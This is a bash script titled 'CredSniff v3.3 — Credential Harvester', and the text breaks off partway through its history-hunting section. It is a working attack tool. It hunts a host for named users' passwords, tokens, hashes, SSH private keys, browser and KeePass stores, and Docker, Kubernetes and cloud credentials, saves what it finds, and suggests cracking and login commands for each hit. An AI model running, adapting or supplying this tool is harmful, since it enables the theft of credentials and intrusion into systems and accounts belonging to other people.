#!/bin/bash
# ============================================================================
#   CredSniff v3.3 — Credential Harvester
#   Target-aware: finds credentials belonging to named users
#   Usage: ./credsniff.sh -p "charles|sam" [-d /var] [-H]
# ============================================================================

# ── Colors ───────────────────────────────────────────────────────────────────
R='\033[0;31m'  G='\033[0;32m'  Y='\033[0;33m'
M='\033[0;35m'  C='\033[0;36m'  W='\033[1;37m'
DIM='\033[2m'   RST='\033[0m'

# ── Defaults ──────────────────────────────────────────────────────────────────
TARGET_DIR_RAW=""
D_SET=0
declare -a TARGET_DIRS=()
declare -a TARGETS=()          # individual terms parsed from -p
PATTERN=""
WORDLIST=""
EXTENSIONS=""
HISTORY_MODE=0
QUIET=0
FOUND_COUNT=0
FILES_SCANNED=0
TOTAL_FILES=0
PROGRESS_ACTIVE=0
RESULTS_DIR=""

declare -a ALL_CREDS=()
declare -a ALL_HASHES=()
declare -a ALL_KEYS=()
declare -a ATTACK_PATHS=()
declare -A _CRED_SEEN=()

# ── Credential line regex ─────────────────────────────────────────────────────
# Matches lines that likely contain a credential value
CRED_LINE_RE='[Pp]ass(word|wd)?[[:space:]]*(is)?[[:space:]]*[=:][[:space:]]*\S|[Ss]ecret[[:space:]]*[=:][[:space:]]*\S|[Tt]oken[[:space:]]*[=:][[:space:]]*\S|[Aa][Pp][Ii][_-]?[Kk]ey[[:space:]]*[=:][[:space:]]*\S|[Cc]redential[[:space:]]*[=:][[:space:]]*\S'

# ── Timestamp ─────────────────────────────────────────────────────────────────
ts() { date +"%H:%M:%S"; }

# ── Progress bar ──────────────────────────────────────────────────────────────
draw_progress() {
    [[ $QUIET -eq 1 ]] && return
    local cur=$1 total=$2 width=38 pct=0
    [[ $total -gt 0 ]] && pct=$(( cur * 100 / total ))
    local filled=$(( pct * width / 100 )) i
    local bar_f="" bar_e=""
    for ((i=0; i<filled; i++));       do bar_f+="█"; done
    for ((i=filled; i<width; i++));   do bar_e+="░"; done
    printf "\r  ${G}[${bar_f}${DIM}${bar_e}${RST}${G}]${RST} ${W}%3d%%${RST}  ${DIM}%d/%d files${RST}   " \
        "$pct" "$cur" "$total" >&2
    PROGRESS_ACTIVE=1
}

clear_progress() {
    [[ $QUIET -eq 1 || $PROGRESS_ACTIVE -eq 0 ]] && return
    printf "\r\033[K" >&2; PROGRESS_ACTIVE=0
}

end_progress() {
    [[ $QUIET -eq 1 ]] && return
    draw_progress "$TOTAL_FILES" "$TOTAL_FILES"; printf "\n" >&2; PROGRESS_ACTIVE=0
}

# ── Results directory ─────────────────────────────────────────────────────────
init_results() {
    RESULTS_DIR="credsniff-results/$(date +"%Y-%m-%d_%H%M%S")"
    mkdir -p "$RESULTS_DIR"
    local hdr="# CredSniff v3.3 — $(date)"$'\n'
    for f in credentials.txt hashes.txt ssh-keys.txt history.txt binary-stores.txt raw-matches.txt 00-summary.txt; do
        echo -e "$hdr" > "${RESULTS_DIR}/${f}"
    done
}

rwrite() { [[ -n "$RESULTS_DIR" ]] && echo -e "$2" >> "${RESULTS_DIR}/$1"; }

# ── Screen hit: only real credential findings ─────────────────────────────────
# Format: [ts] TARGET  →  VALUE   (source)
cred_hit() {
    local target="$1" value="$2" src="$3" type="${4:-CRED}"
    [[ -z "$value" || "$value" =~ ^[[:space:]]*$ ]] && return
    local _dk="${target}|${value}"
    [[ -n "${_CRED_SEEN[$_dk]+x}" ]] && return
    _CRED_SEEN[$_dk]=1
    FOUND_COUNT=$((FOUND_COUNT + 1))
    ALL_CREDS+=("${target}|${value}|${src}")
    ATTACK_PATHS+=("Try ${target}:${value}")

    local color
    case "$type" in
        HASH) color="$Y" ;;
        KEY)  color="$R" ;;
        HIST) color="$Y" ;;
        NET)  color="$C" ;;
        *)    color="$G" ;;
    esac

    clear_progress
    printf "[%s] ${color}%-10s${RST} ${W}→${RST}  ${R}%s${RST}   ${DIM}%s${RST}\n" \
        "$(ts)" "$target" "$value" "$src"
    rwrite "credentials.txt" "$(printf '%-10s → %s   (%s)' "$target" "$value" "$src")"
    rwrite "00-summary.txt"  "$(printf '[%s] %-10s → %s   (%s)' "$(ts)" "$target" "$value" "$src")"
    [[ $TOTAL_FILES -gt 0 ]] && draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
}

# ── Banner ────────────────────────────────────────────────────────────────────
banner() {
    [[ $QUIET -eq 1 ]] && return
    echo -e "${C}"
    cat << 'BANNER'
   ___ ___ ___ ___  ___ _  _ ___ ___ ___
  / __| _ \ __|   \/ __| \| |_ _| __| __|
 | (__|   / _|| |) \__ \ .` || || _|| _|
  \___|_|_\___|___/|___/_|\_|___|_| |_|
BANNER
    echo -e "${RST}"
    echo -e "  ${DIM}v3.3${RST} | ${Y}Credential Harvester${RST}"
    echo ""
}

# ── Usage ─────────────────────────────────────────────────────────────────────
usage() {
    echo -e "${W}Usage:${RST}"
    echo "  credsniff.sh -p \"charles|sam\" [options]"
    echo ""
    echo -e "${W}Options:${RST}"
    echo "  -d DIR        Target directory (default: /root /home /etc /opt /var/mail /var/www)"
    echo "                  Use + for multiple: /var/mail+lib+www  or absolute: /var/mail+/etc+/home"
    echo "  -p TARGETS    Target usernames/keywords (pipe-separated)"
    echo "  -w FILE       Load targets from wordlist"
    echo "  -e EXTS       Extension filter (e.g. conf,php,txt)"
    echo "  -H            Also hunt shell/db/REPL history files"
    echo "  -q            Quiet — no banner or progress bar"
    echo "  -h            Help"
    echo ""
    echo -e "${W}Always scans:${RST}"
    echo "  Binary stores  .kdbx .p12/.pfx GNOME keyring browser Login Data Firefox logins.json"
    echo "  Network creds  systemd env vars Docker config k8s kubeconfig AWS/GCP/Azure creds"
    echo ""
    echo -e "${W}Examples:${RST}"
    echo "  credsniff.sh -p \"charles|sam\""
    echo "  credsniff.sh -p \"charles|sam\" -d /var/mail+www+lib"
    echo "  credsniff.sh -p \"charles\" -H"
    exit 0
}

# ── Arg parsing ───────────────────────────────────────────────────────────────
while getopts "d:p:w:e:Hqh" opt; do
    case $opt in
        d) TARGET_DIR_RAW="$OPTARG"; D_SET=1 ;;
        p) PATTERN="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        e) EXTENSIONS="$OPTARG" ;;
        H) HISTORY_MODE=1 ;;
        q) QUIET=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ── Wordlist loading ───────────────────────────────────────────────────────────
if [[ -n "$WORDLIST" ]]; then
    [[ ! -f "$WORDLIST" ]] && { echo -e "${R}[!] Wordlist not found: ${WORDLIST}${RST}"; exit 1; }
    wl=$(grep -v '^#' "$WORDLIST" | grep -v '^$' | paste -sd'|')
    PATTERN="${PATTERN:+${PATTERN}|}${wl}"
fi

if [[ -z "$PATTERN" && $HISTORY_MODE -eq 0 ]]; then
    echo -e "${R}[!] -p TARGETS or -H required${RST}"; usage
fi

# Parse individual targets from pattern
IFS='|' read -ra TARGETS <<< "$PATTERN"

# ── Expand + syntax or apply smart defaults ────────────────────────────────────
if [[ $D_SET -eq 0 ]]; then
    for _sd in /root /home /etc /opt /var/mail /var/www; do
        [[ -d "$_sd" ]] && TARGET_DIRS+=("$_sd")
    done
    [[ ${#TARGET_DIRS[@]} -eq 0 ]] && TARGET_DIRS=("/var")
elif [[ "$TARGET_DIR_RAW" == *"+"* ]]; then
    IFS='+' read -ra _parts <<< "$TARGET_DIR_RAW"
    _base=$(dirname "${_parts[0]}")
    for _p in "${_parts[@]}"; do
        if [[ "$_p" == "${_parts[0]}" || "$_p" == /* ]]; then
            TARGET_DIRS+=("$_p")
        else
            TARGET_DIRS+=("${_base}/${_p}")
        fi
    done
else
    TARGET_DIRS=("$TARGET_DIR_RAW")
fi

for _td in "${TARGET_DIRS[@]}"; do
    [[ ! -d "$_td" ]] && { echo -e "${R}[!] Not a directory: ${_td}${RST}"; exit 1; }
done

# ── Hash identification ────────────────────────────────────────────────────────
identify_hash() {
    local h="$1" l=${#1}
    [[ "$h" =~ ^\$2[aby]?\$  ]] && echo "bcrypt|hashcat -m 3200"           && return
    [[ "$h" =~ ^\$6\$        ]] && echo "sha512crypt|hashcat -m 1800"      && return
    [[ "$h" =~ ^\$5\$        ]] && echo "sha256crypt|hashcat -m 7400"      && return
    [[ "$h" =~ ^\$1\$        ]] && echo "md5crypt|hashcat -m 500"          && return
    [[ "$h" =~ ^\$apr1\$     ]] && echo "APR1-MD5|hashcat -m 1600"         && return
    [[ $l -eq 32  && "$h" =~ ^[a-fA-F0-9]{32}$  ]] && echo "MD5/NTLM|hashcat -m 0 or -m 1000" && return
    [[ $l -eq 40  && "$h" =~ ^[a-fA-F0-9]{40}$  ]] && echo "SHA-1|hashcat -m 100"             && return
    [[ $l -eq 64  && "$h" =~ ^[a-fA-F0-9]{64}$  ]] && echo "SHA-256|hashcat -m 1400"          && return
    [[ $l -eq 128 && "$h" =~ ^[a-fA-F0-9]{128}$ ]] && echo "SHA-512|hashcat -m 1700"          && return
    [[ $l -eq 16  && "$h" =~ ^[a-fA-F0-9]{16}$  ]] && echo "MySQL323|hashcat -m 200"          && return
    [[ $l -eq 13  && "$h" =~ ^[a-zA-Z0-9./]{13}$ ]] && echo "DES-crypt|hashcat -m 1500"       && return
    echo "unknown|"
}

# ── Extract credential value from a line ──────────────────────────────────────
# Handles: "Password is: VALUE", "password=VALUE", "Password: VALUE", "secret=VALUE"
extract_cred_value() {
    local line="$1"
    local val=""

    # Pattern: word (optional "is") [=:] value
    # e.g. "Password is:  ^xHhA&hvim0y"  or  "password=hunter2"
    if [[ "$line" =~ [Pp]ass(word|wd)?[[:space:]]*(is)?[[:space:]]*[=:][[:space:]]*(.+) ]]; then
        val="${BASH_REMATCH[3]}"
    elif [[ "$line" =~ [Ss]ecret[[:space:]]*(is[[:space:]]+)?[=:][[:space:]]*(.+) ]]; then
        val="${BASH_REMATCH[2]}"
    elif [[ "$line" =~ [Tt]oken[[:space:]]*(is[[:space:]]+)?[=:][[:space:]]*(.+) ]]; then
        val="${BASH_REMATCH[2]}"
    elif [[ "$line" =~ [Aa][Pp][Ii][_-]?[Kk]ey[[:space:]]*[=:][[:space:]]*(.+) ]]; then
        val="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ (mysql|postgres|mongodb|redis)://([^:]+):([^@]+)@ ]]; then
        val="${BASH_REMATCH[3]}"
    fi

    # Trim whitespace, quotes
    val=$(echo "$val" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//; s/^["'"'"']//; s/["'"'"']$//')
    # Attempt base64 decode if value looks encoded (>=16 base64 chars)
    if [[ "$val" =~ ^[A-Za-z0-9+/]{16,}={0,2}$ ]]; then
        local _dec
        _dec=$(printf '%s' "$val" | base64 -d 2>/dev/null | tr -cd '[:print:]')
        if [[ ${#_dec} -ge 8 && "$_dec" =~ [[:alnum:]] && \
              ! "$_dec" =~ ^(true|false|null|none|NULL|None|NONE|undefined|yes|no|empty)$ ]]; then
            val="${_dec}  [b64]"
        fi
    fi
    # Discard trivially short or obviously non-secret placeholder values
    local _cv="${val%  \[b64\]}"
    [[ ${#_cv} -lt 4 ]] && val=""
    [[ "$_cv" =~ ^(true|false|null|none|NULL|None|NONE|undefined|yes|no|empty|Bearer|bearer|changeme|CHANGEME|example|EXAMPLE)$ ]] && val=""
    echo "$val"
}

# ── Detect mail file ──────────────────────────────────────────────────────────
is_mail_file() {
    local file="$1"
    [[ "$file" =~ /mail/ || "$file" =~ /spool/mail ]] && return 0
    head -10 "$file" 2>/dev/null | grep -qE "^(From |Received:|MIME-Version:|Message-Id:)" && return 0
    return 1
}

# ── Which targets appear in this file ─────────────────────────────────────────
file_targets() {
    local file="$1"
    [[ -z "$PATTERN" || ${#TARGETS[@]} -eq 0 ]] && return
    local found=()
    # Single grep pass with the combined pattern — O(1) instead of O(N targets)
    local _hits
    _hits=$(grep -oiE "\b(${PATTERN})\b" "$file" 2>/dev/null | \
            awk '{print tolower($0)}' | sort -u)
    [[ -z "$_hits" ]] && return
    for t in "${TARGETS[@]}"; do
        local _tl; _tl=$(echo "$t" | tr '[:upper:]' '[:lower:]')
        echo "$_hits" | grep -qxF "$_tl" && found+=("$t")
    done
    echo "${found[@]}"
}

# ── Primary target: prefer sender of mail, else first matched ─────────────────
primary_target_for_mail() {
    local file="$1"; shift
    local targets=("$@")
    local from_line
    from_line=$(grep -im1 "^From:" "$file" 2>/dev/null)
    for t in "${targets[@]}"; do
        echo "$from_line" | grep -qi "$t" && { echo "$t"; return; }
    done
    echo "${targets[0]}"
}

# ── Scan a mail file ──────────────────────────────────────────────────────────
scan_mail() {
    local file="$1"; shift
    local targets=("$@")
    local primary
    primary=$(primary_target_for_mail "$file" "${targets[@]}")

    # Scan full file body for credential lines
    local cred_lines
    cred_lines=$(grep -niE "$CRED_LINE_RE" "$file" 2>/dev/null)
    if [[ -n "$cred_lines" ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            local ln="${line%%:*}" content="${line#*:}"
            local val; val=$(extract_cred_value "$content")
            [[ -n "$val" ]] && cred_hit "$primary" "$val" "${file}:${ln}"
        done <<< "$cred_lines"
    fi

    # Also check for hashes
    scan_hashes "$file" "$primary"
    scan_keys "$file" "$primary"
}

# ── Scan a non-mail file with context window ──────────────────────────────────
scan_context() {
    local file="$1"; shift
    local targets=("$@")
    local ctx=8   # lines of context above/below target mention

    # Full-file scan for small files or structured config/document files —
    # catches passwords that sit far from the username mention
    local line_count full_scan=0
    line_count=$(wc -l < "$file" 2>/dev/null || echo 9999)
    if [[ $line_count -lt 500 ]] || \
       [[ "$file" =~ \.(conf|cfg|ini|env|yaml|yml|xml|json|toml|properties|txt|md|php|py|rb|pl|sh)$ ]]; then
        full_scan=1
    fi

    for target in "${targets[@]}"; do
        if [[ $full_scan -eq 1 ]]; then
            # Scan every credential line in the file; dedup handles repeated hits
            local cred_lines
            cred_lines=$(grep -niE "$CRED_LINE_RE" "$file" 2>/dev/null)
            if [[ -n "$cred_lines" ]]; then
                while IFS= read -r cline; do
                    [[ -z "$cline" ]] && continue
                    local cln="${cline%%:*}" ccontent="${cline#*:}"
                    local val; val=$(extract_cred_value "$ccontent")
                    [[ -n "$val" ]] && cred_hit "$target" "$val" "${file}:${cln}"
                done <<< "$cred_lines"
            fi
            # Also look for inline user:pass
            local hit_lines
            hit_lines=$(grep -niE "\b${target}\b" "$file" 2>/dev/null)
            while IFS= read -r hit; do
                [[ -z "$hit" ]] && continue
                local ln="${hit%%:*}" hitcontent="${hit#*:}"
                if [[ "$hitcontent" =~ ${target}[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
                    local p="${BASH_REMATCH[1]}"
                    [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev) ]] && \
                        cred_hit "$target" "$p" "${file}:${ln}"
                fi
            done <<< "$hit_lines"
        else
            # Context-window scan for large unstructured files
            local hit_lines
            hit_lines=$(grep -niE "\b${target}\b" "$file" 2>/dev/null)
            [[ -z "$hit_lines" ]] && continue

            while IFS= read -r hit; do
                local ln="${hit%%:*}"
                local start=$(( ln - ctx )); [[ $start -lt 1 ]] && start=1
                local end=$(( ln + ctx ))

                local block
                block=$(sed -n "${start},${end}p" "$file" 2>/dev/null)

                while IFS= read -r bline; do
                    echo "$bline" | grep -qE "$CRED_LINE_RE" || continue
                    local val; val=$(extract_cred_value "$bline")
                    [[ -n "$val" ]] && cred_hit "$target" "$val" "${file}:${ln}"
                done <<< "$block"

                local hitcontent="${hit#*:}"
                if [[ "$hitcontent" =~ ${target}[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
                    local p="${BASH_REMATCH[1]}"
                    [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev) ]] && \
                        cred_hit "$target" "$p" "${file}:${ln}"
                fi
            done <<< "$hit_lines"
        fi
    done
}

# ── Hash scan ─────────────────────────────────────────────────────────────────
scan_hashes() {
    local file="$1" target="${2:-hash}"
    local hits
    hits=$(grep -noE '\$[0-9a-z]+\$[^\s:]{8,}|\b[a-fA-F0-9]{32,128}\b' "$file" 2>/dev/null | head -10)
    [[ -z "$hits" ]] && return
    while IFS= read -r hit; do
        [[ -z "$hit" ]] && continue
        local ln="${hit%%:*}" hash="${hit#*:}"
        [[ ${#hash} -gt 128 ]] && continue
        local id_r; id_r=$(identify_hash "$hash")
        local ht="${id_r%%|*}" cc="${id_r#*|}"
        [[ "$ht" == "unknown" ]] && continue
        ALL_HASHES+=("${ht}|${hash}|${cc}|${file}")
        ATTACK_PATHS+=("Crack ${ht}: ${cc} (hash from ${file})")
        clear_progress
        printf "[%s] ${Y}%-10s${RST} ${W}→${RST}  ${Y}%s${RST}   ${DIM}%s${RST}\n" \
            "$(ts)" "${ht}" "${hash:0:60}" "${file}:${ln}"
        rwrite "hashes.txt" "$(printf '%-12s %s' "$ht" "$hash")"
        rwrite "hashes.txt" "  crack: ${cc}   from: ${file}:${ln}"
        rwrite "hashes.txt" ""
        rwrite "00-summary.txt" "$(printf '[%s] HASH  %-10s %s   (%s)' "$(ts)" "$ht" "${hash:0:50}" "$file")"
        [[ $TOTAL_FILES -gt 0 ]] && draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
    done <<< "$hits"
}

# ── SSH key scan ──────────────────────────────────────────────────────────────
scan_keys() {
    local file="$1" target="${2:-key}"
    grep -ql "PRIVATE KEY" "$file" 2>/dev/null || return
    local ktype="Unknown"
    grep -q "RSA"     "$file" 2>/dev/null && ktype="RSA"
    grep -q "DSA"     "$file" 2>/dev/null && ktype="DSA"
    grep -q "EC"      "$file" 2>/dev/null && ktype="EC"
    grep -q "OPENSSH" "$file" 2>/dev/null && ktype="OpenSSH"
    local ks="unprotected"
    grep -q "ENCRYPTED" "$file" 2>/dev/null && ks="encrypted"
    ALL_KEYS+=("${file}|${ktype}|${ks}")
    if [[ "$ks" == "encrypted" ]]; then
        ATTACK_PATHS+=("Crack ${ktype} key: ssh2john ${file} > k.hash && john k.hash")
    else
        ATTACK_PATHS+=("Use ${ktype} key: chmod 600 ${file} && ssh -i ${file} user@target")
    fi
    clear_progress
    printf "[%s] ${R}%-10s${RST} ${W}→${RST}  ${R}%s private key (%s)${RST}   ${DIM}%s${RST}\n" \
        "$(ts)" "$target" "$ktype" "$ks" "$file"
    rwrite "ssh-keys.txt" "$(printf '%s (%s)   %s' "$ktype" "$ks" "$file")"
    if [[ "$ks" == "encrypted" ]]; then
        rwrite "ssh-keys.txt" "  crack: ssh2john ${file} > k.hash && john k.hash"
    else
        rwrite "ssh-keys.txt" "  use:   chmod 600 ${file} && ssh -i ${file} user@target"
    fi
    rwrite "ssh-keys.txt" ""
    [[ $TOTAL_FILES -gt 0 ]] && draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
}

# ── Binary credential store scanner ──────────────────────────────────────────
scan_binary_stores() {

    _bs_hit() {
        local stype="$1" spath="$2" snote="$3"
        clear_progress
        printf "[%s] ${M}%-12s${RST} ${W}→${RST}  ${M}%s${RST}   ${DIM}%s${RST}\n" \
            "$(ts)" "$stype" "$spath" "$snote"
        rwrite "binary-stores.txt" "$(printf '%-12s %s' "$stype" "$spath")"
        rwrite "binary-stores.txt" "  note: ${snote}"
        rwrite "binary-stores.txt" ""
        ATTACK_PATHS+=("${stype}: ${snote}")
    }

    # KeePass databases (.kdbx)
    while IFS= read -r f; do
        [[ -z "$f" ]] && continue
        _bs_hit "KeePass" "$f" "keepass2john ${f} > kp.hash && john --wordlist=rockyou.txt kp.hash"
    done < <(find /root /home /opt /var/www -name "*.kdbx" -type f 2>/dev/null)

    # PKCS#12 bundles (.p12 / .pfx)
    while IFS= read -r f; do
        [[ -z "$f" ]] && continue
        _bs_hit "PKCS12" "$f" "pfx2john ${f} > pfx.hash && john pfx.hash  |OR|  openssl pkcs12 -in ${f} -nodes -passin pass:"
    done < <(find /root /home /opt /etc/ssl -type f \( -name "*.p12" -o -name "*.pfx" \) 2>/dev/null)

    # GNOME keyring files
    while IFS= read -r f; do
        [[ -z "$f" ]] && continue
        _bs_hit "GNOMEkey" "$f" "secret-tool lookup or python3 -c 'import secretstorage; ...'"
    done < <(find /root /home -type f -name "*.keyring" 2>/dev/null)

    # Chrome / Chromium / Edge / Brave Login Data (SQLite)
    while IFS= read -r f; do
        [[ -z "$f" ]] && continue
        local bnote="sqlite3 '${f}' \"SELECT origin_url,username_value FROM logins;\""
        if command -v sqlite3 &>/dev/null; then
            local uinfo
            uinfo=$(sqlite3 "$f" \
                "SELECT origin_url||'  ['||username_value||']' FROM logins WHERE username_value != '' LIMIT 5;" \
                2>/dev/null | paste -sd'  |  ' 2>/dev/null)
            [[ -n "$uinfo" ]] && bnote="$uinfo"
        fi
        _bs_hit "BrowserDB" "$f" "$bnote"
    done < <(find /root /home -type f -name "Login Data" 2>/dev/null | \
             grep -E "(google-chrome|chromium|microsoft-edge|brave-browser|Chrome)/")

    # Firefox logins.json
    while IFS= read -r f; do
        [[ -z "$f" ]] && continue
        _bs_hit "Firefox" "$f" "firefox_decrypt or firepwd.py  (logins NSS-encrypted with key4.db)"
    done < <(find /root /home -type f -name "logins.json" -path "*firefox*" 2>/dev/null)
}

# ── Network / system credential source scanner ────────────────────────────────
scan_network_creds() {

    # ── systemd service environment variables ─────────────────────────────────
    local svc_cred_re='Environment=.*[_](PASS|SECRET|TOKEN|KEY|PWD|CRED)[^=]*='
    while IFS= read -r svc; do
        [[ -r "$svc" ]] || continue
        while IFS= read -r line; do
            local kv="${line#*Environment=}" k="${kv%%=*}" v="${kv#*=}"
            v=$(echo "$v" | sed 's/^["'"'"' ]//; s/["'"'"' ]$//')
            [[ ${#v} -ge 4 ]] && cred_hit "systemd" "$v" "${svc} [${k}]" "NET"
        done < <(grep -E "$svc_cred_re" "$svc" 2>/dev/null)
        # EnvironmentFile= references
        while IFS= read -r ef_raw; do
            local ef="${ef_raw#*EnvironmentFile=}"; ef="${ef#-}"
            ef=$(echo "$ef" | tr -d '"')
            [[ -f "$ef" && -r "$ef" ]] || continue
            while IFS= read -r eline; do
                [[ "$eline" =~ ^[[:space:]]*# || -z "$eline" ]] && continue
                local ev; ev=$(extract_cred_value "$eline")
                [[ -n "$ev" ]] && cred_hit "systemd" "$ev" "$ef" "NET"
            done < "$ef"
        done < <(grep "^EnvironmentFile=" "$svc" 2>/dev/null)
    done < <(find /etc/systemd /lib/systemd -name "*.service" 2>/dev/null)

    # ── Docker registry auth (base64 decoded) ─────────────────────────────────
    for dcfg in /root/.docker/config.json /home/*/.docker/config.json; do
        [[ -f "$dcfg" && -r "$dcfg" ]] || continue
        while IFS= read -r b64; do
            [[ -z "$b64" ]] && continue
            local dec; dec=$(printf '%s' "$b64" | base64 -d 2>/dev/null)
            [[ -n "$dec" && "$dec" == *:* ]] && cred_hit "docker" "$dec" "$dcfg" "NET"
        done < <(grep -oE '"auth"[[:space:]]*:[[:space:]]*"[A-Za-z0-9+/=]+"' "$dcfg" 2>/dev/null | \
                 sed 's/.*"auth"[[:space:]]*:[[:space:]]*"//; s/"$//')
    done

    # ── Kubernetes kubeconfig tokens / passwords ──────────────────────────────
    for kcfg in /root/.kube/config /home/*/.kube/config; do
        [[ -f "$kcfg" && -r "$kcfg" ]] || continue
        while IFS= read -r line; do
            local v; v=$(echo "$line" | sed 's/.*:[[:space:]]*//; s/^"//; s/"$//')
            v=$(echo "$v" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
            [[ ${#v} -ge 8 ]] && cred_hit "k8s" "$v" "$kcfg" "NET"
        done < <(grep -E "^[[:space:]]*(token|password):[[:space:]]\S" "$kcfg" 2>/dev/null)
    done

    # ── AWS credentials (~/.aws/credentials) ─────────────────────────────────
    for awscfg in /root/.aws/credentials /home/*/.aws/credentials; do
        [[ -f "$awscfg" && -r "$awscfg" ]] || continue
        while IFS= read -r line; do
            local v="${line#*=}"; v=$(echo "$v" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
            [[ ${#v} -ge 16 ]] && cred_hit "AWS" "$v" "$awscfg" "NET"
        done < <(grep -iE "(secret_access_key|session_token)[[:space:]]*=" "$awscfg" 2>/dev/null)
    done

    # ── GCP application default credentials ──────────────────────────────────
    for gcpcfg in /root/.config/gcloud/application_default_credentials.json \
                  /home/*/.config/gcloud/application_default_credentials.json; do
        [[ -f "$gcpcfg" && -r "$gcpcfg" ]] || continue
        while IFS= read -r line; do
            local v; v=$(echo "$line" | sed 's/.*:[[:space:]]*"//; s/".*//')
            [[ ${#v} -ge 8 ]] && cred_hit "GCP" "$v" "$gcpcfg" "NET"
        done < <(grep -E '"(client_secret|refresh_token)"' "$gcpcfg" 2>/dev/null)
    done

    # ── Azure access tokens ───────────────────────────────────────────────────
    for azcfg in /root/.azure/accessTokens.json /home/*/.azure/accessTokens.json; do
        [[ -f "$azcfg" && -r "$azcfg" ]] || continue
        while IFS= read -r line; do
            local v; v=$(echo "$line" | sed 's/.*:[[:space:]]*"//; s/".*//')
            [[ ${#v} -ge 16 ]] && cred_hit "Azure" "$v" "$azcfg" "NET"
        done < <(grep -E '"(accessToken|refreshToken)"' "$azcfg" 2>/dev/null)
    done
}

# ── Per-file dispatcher ───────────────────────────────────────────────────────
scan_file() {
    local file="$1"
    [[ ! -r "$file" ]] && return
    file "$file" 2>/dev/null | grep -q "text" || return

    FILES_SCANNED=$((FILES_SCANNED + 1))
    draw_progress "$FILES_SCANNED" "$TOTAL_FILES"

    # Which targets appear in this file?
    local matched
    read -ra matched <<< "$(file_targets "$file")"
    [[ ${#matched[@]} -eq 0 ]] && return   # irrelevant file

    rwrite "raw-matches.txt" "FILE: ${file}  (targets: ${matched[*]})"

    if is_mail_file "$file"; then
        scan_mail "$file" "${matched[@]}"
    else
        scan_context "$file" "${matched[@]}"
        scan_hashes "$file" "${matched[0]}"
        scan_keys   "$file" "${matched[0]}"
    fi
}

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
main() {
    banner
    init_results

    if [[ $QUIET -eq 0 ]]; then
        local pat_display="$PATTERN"
        [[ ${#pat_display} -gt 80 ]] && pat_display="${pat_display:0:77}..."
        echo -e " ${W}Targets:${RST} ${C}${pat_display}${RST}"
        echo -e " ${W}Dirs:${RST}    ${C}${TARGET_DIRS[*]}${RST}"
        [[ -n "$EXTENSIONS" ]] && echo -e " ${W}Ext:${RST}     ${C}${EXTENSIONS}${RST}"
        [[ $HISTORY_MODE -eq 1 ]] && echo -e " ${W}History:${RST} ${C}bash zsh fish python mysql psql sqlite redis${RST}"
        echo -e " ${W}Extra:${RST}   ${C}binary stores + network/cloud creds${RST}"
        echo -e " ${W}Results:${RST} ${C}${RESULTS_DIR}/${RST}"
        echo ""
    fi

    local start_time; start_time=$(date +%s)

    # ── Build file list ────────────────────────────────────────────────────────
    local all_files
    all_files=$(find "${TARGET_DIRS[@]}" -type f 2>/dev/null)
    [[ -n "$EXTENSIONS" ]] && \
        all_files=$(echo "$all_files" | grep -E "\.(${EXTENSIONS//,/|})$")
    TOTAL_FILES=$(echo "$all_files" | grep -c . 2>/dev/null || echo 0)
    [[ -z "$(echo "$all_files" | tr -d '[:space:]')" ]] && TOTAL_FILES=0

    [[ $QUIET -eq 0 && $TOTAL_FILES -gt 0 ]] && draw_progress 0 "$TOTAL_FILES"

    if [[ $TOTAL_FILES -gt 0 ]]; then
        while IFS= read -r file; do
            [[ -z "$file" ]] && continue
            scan_file "$file"
        done <<< "$all_files"
    fi

    # ── History hunting (-H) ───────────────────────────────────────────────────
    if [[ $HISTORY_MODE -eq 1 ]]; then
        local hist_pat='sshpass[[:space:]]+-p|mysql[[:space:]].*-p[^[:space:]]|curl[[:space:]].*(-u|--user)[[:space:]]+[^[:space:]]+:[^[:space:]]|wget[[:space:]].*(--password|--http-password)[=[:space:]][^[:space:]]|export[[:space:]]+(PASSWORD|PASS|SECRET|TOKEN|KEY|API_KEY)[=[:space:]]|[Pp]ass(word)?[[:space:]]*=[[:space:]]*\S|--password[=[:space:]]\S|IDENTIFIED[[:space:]]+(BY|WITH)[[:space:]]+'"'"'\S'
        local hfiles=()
        for f in /root/.bash_history   /root/.zsh_history \
                  /root/.local/share/fish/fish_history \
                  /root/.python_history /root/.mysql_history \
                  /root/.psql_history   /root/.sqlite_history /root/.rediscli_history \
                  /home/*/.bash_history /home/*/.zsh_history \
                  /home/*/.local/share/fish/fish_history \
                  /home/*/.python_history /home/*/.mysql_history \
                  /home/*/.psql_history   /home/*/.sqlite_history /home/*/.rediscli_history \
                  ~/.bash_history ~/.zsh_history; do
            [[ -f "$f" && -r "$f" ]] && hfiles+=("$f")
        done

        declare -A _sh=(); declare -a _uh=()
        for f in "${hfiles[@]}"; do
            local real; real=$(realpath "$f" 2>/dev/null || echo "$f")
            [[ -z "${_sh[$real]+x}" ]] && { _sh[$real]=1; _uh+=("$real"); }
        done

        for hf in "${_uh[@]}"; do
            local owner; owner=$(stat -c '%U' "$hf" 2>/dev/null || echo "?")

            # Credential-leaking commands
            local hits; hits=$(grep -nE "$hist_pat" "$hf" 2>/dev/null)
            if [[ -n "$hits" ]]; then
                while IFS= read -r hit; do
                    [[ -z "$hit" ]] && continue
                    local ln="${hit%%:*}" cmd="${hit#*:}"
                    cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
                    local val; val=$(extract_cred_value "$cmd")
                    [[ -z "$val" ]] && val="$cmd"
                    [[ ${#val} -gt 100 ]] && val="${val:0:97}..."
                    clear_progress
                    printf "[%s] ${Y}%-10s${RST} ${W}→${RST}  ${R}%s${RST}   ${DIM}%s${RST}\n" \
                        "$(ts)" "hist:${owner}" "$val" "${hf}:${ln}"
                    rwrite "history.txt" "$(printf '%-12s → %s   (%s:%s)' "$owner" "$val" "$hf" "$ln")"
                    ATTACK_PATHS+=("History hit for ${owner}: ${val}")
